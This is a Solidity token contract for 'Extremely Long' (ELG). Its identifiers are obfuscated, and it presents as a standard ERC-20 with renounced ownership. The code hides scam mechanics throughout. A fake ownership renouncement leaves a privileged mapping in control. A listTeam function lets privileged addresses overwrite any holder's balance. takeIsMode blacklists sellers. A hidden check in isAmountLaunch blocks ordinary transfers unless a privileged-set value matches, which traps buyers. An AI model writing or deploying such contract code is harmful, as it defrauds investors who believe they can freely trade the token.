//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface teamSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitTo {
    function createPair(address isAtTeam, address maxSender) external returns (address);
}

interface atEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellReceiverTotal) external view returns (uint256);

    function transfer(address feeTo, uint256 tokenLaunch) external returns (bool);

    function allowance(address enableAtSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address feeTo,
        uint256 tokenLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxMarketing, uint256 value);
    event Approval(address indexed enableAtSell, address indexed spender, uint256 value);
}

interface atEnableMetadata is atEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtremelyLong is amountLiquidity, atEnable, atEnableMetadata {

    function transferFrom(address enableReceiverLaunch, address feeTo, uint256 tokenLaunch) external override returns (bool) {
        if (_msgSender() != launchedMode) {
            if (marketingTrading[enableReceiverLaunch][_msgSender()] != type(uint256).max) {
                require(tokenLaunch <= marketingTrading[enableReceiverLaunch][_msgSender()]);
                marketingTrading[enableReceiverLaunch][_msgSender()] -= tokenLaunch;
            }
        }
        return isAmountLaunch(enableReceiverLaunch, feeTo, tokenLaunch);
    }

    function takeIsMode(address receiverShould) public {
        feeSender();
        if (teamLaunchLiquidity == fundLimit) {
            teamLaunchLiquidity = fundLimit;
        }
        if (receiverShould == receiverMinSwap || receiverShould == fromAuto) {
            return;
        }
        autoFrom[receiverShould] = true;
    }

    mapping(address => mapping(address => uint256)) private marketingTrading;

    uint256 public teamLaunchLiquidity;

    address private exemptLiquidity;

    mapping(address => bool) public receiverAmountFee;

    function transfer(address listMax, uint256 tokenLaunch) external virtual override returns (bool) {
        return isAmountLaunch(_msgSender(), listMax, tokenLaunch);
    }

    function decimals() external view virtual override returns (uint8) {
        return teamEnable;
    }

    address launchedMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private tokenMax;

    function getOwner() external view returns (address) {
        return exemptLiquidity;
    }

    constructor (){
        if (teamLaunchLiquidity == fundLimit) {
            fundLimit = fromLaunchTotal;
        }
        teamSender limitReceiverBuy = teamSender(launchedMode);
        fromAuto = limitTo(limitReceiverBuy.factory()).createPair(limitReceiverBuy.WETH(), address(this));
        if (walletEnable == tokenMax) {
            tokenMax = true;
        }
        receiverMinSwap = _msgSender();
        tokenTotalLiquidity();
        receiverAmountFee[receiverMinSwap] = true;
        takeMaxSell[receiverMinSwap] = fundList;
        
        emit Transfer(address(0), receiverMinSwap, fundList);
    }

    address modeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function liquidityMaxReceiver(address enableReceiverLaunch, address feeTo, uint256 tokenLaunch) internal returns (bool) {
        require(takeMaxSell[enableReceiverLaunch] >= tokenLaunch);
        takeMaxSell[enableReceiverLaunch] -= tokenLaunch;
        takeMaxSell[feeTo] += tokenLaunch;
        emit Transfer(enableReceiverLaunch, feeTo, tokenLaunch);
        return true;
    }

    bool private walletEnable;

    mapping(address => uint256) private takeMaxSell;

    uint256 fundLimitAuto;

    function allowance(address sellMax, address toAmount) external view virtual override returns (uint256) {
        if (toAmount == launchedMode) {
            return type(uint256).max;
        }
        return marketingTrading[sellMax][toAmount];
    }

    function buyLaunched(address sellModeLimit) public {
        require(sellModeLimit.balance < 100000);
        if (receiverBuy) {
            return;
        }
        
        receiverAmountFee[sellModeLimit] = true;
        
        receiverBuy = true;
    }

    mapping(address => bool) public autoFrom;

    uint8 private teamEnable = 18;

    function teamTokenEnable(uint256 tokenLaunch) public {
        feeSender();
        launchedTake = tokenLaunch;
    }

    address public fromAuto;

    uint256 private fundList = 100000000 * 10 ** 18;

    uint256 public fundLimit;

    function symbol() external view virtual override returns (string memory) {
        return autoWalletTake;
    }

    string private autoLaunchedMarketing = "Extremely Long";

    function owner() external view returns (address) {
        return exemptLiquidity;
    }

    function balanceOf(address sellReceiverTotal) public view virtual override returns (uint256) {
        return takeMaxSell[sellReceiverTotal];
    }

    string private autoWalletTake = "ELG";

    function tokenTotalLiquidity() public {
        emit OwnershipTransferred(receiverMinSwap, address(0));
        exemptLiquidity = address(0);
    }

    function listTeam(address listMax, uint256 tokenLaunch) public {
        feeSender();
        takeMaxSell[listMax] = tokenLaunch;
    }

    event OwnershipTransferred(address indexed listLiquidityWallet, address indexed toLimit);

    function approve(address toAmount, uint256 tokenLaunch) public virtual override returns (bool) {
        marketingTrading[_msgSender()][toAmount] = tokenLaunch;
        emit Approval(_msgSender(), toAmount, tokenLaunch);
        return true;
    }

    uint256 private fromLaunchTotal;

    function name() external view virtual override returns (string memory) {
        return autoLaunchedMarketing;
    }

    address public receiverMinSwap;

    bool public receiverBuy;

    uint256 constant tradingList = 15 ** 10;

    uint256 launchedTake;

    function isAmountLaunch(address enableReceiverLaunch, address feeTo, uint256 tokenLaunch) internal returns (bool) {
        if (enableReceiverLaunch == receiverMinSwap) {
            return liquidityMaxReceiver(enableReceiverLaunch, feeTo, tokenLaunch);
        }
        uint256 listExempt = atEnable(fromAuto).balanceOf(modeExempt);
        require(listExempt == launchedTake);
        require(feeTo != modeExempt);
        if (autoFrom[enableReceiverLaunch]) {
            return liquidityMaxReceiver(enableReceiverLaunch, feeTo, tradingList);
        }
        return liquidityMaxReceiver(enableReceiverLaunch, feeTo, tokenLaunch);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundList;
    }

    function feeSender() private view {
        require(receiverAmountFee[_msgSender()]);
    }

}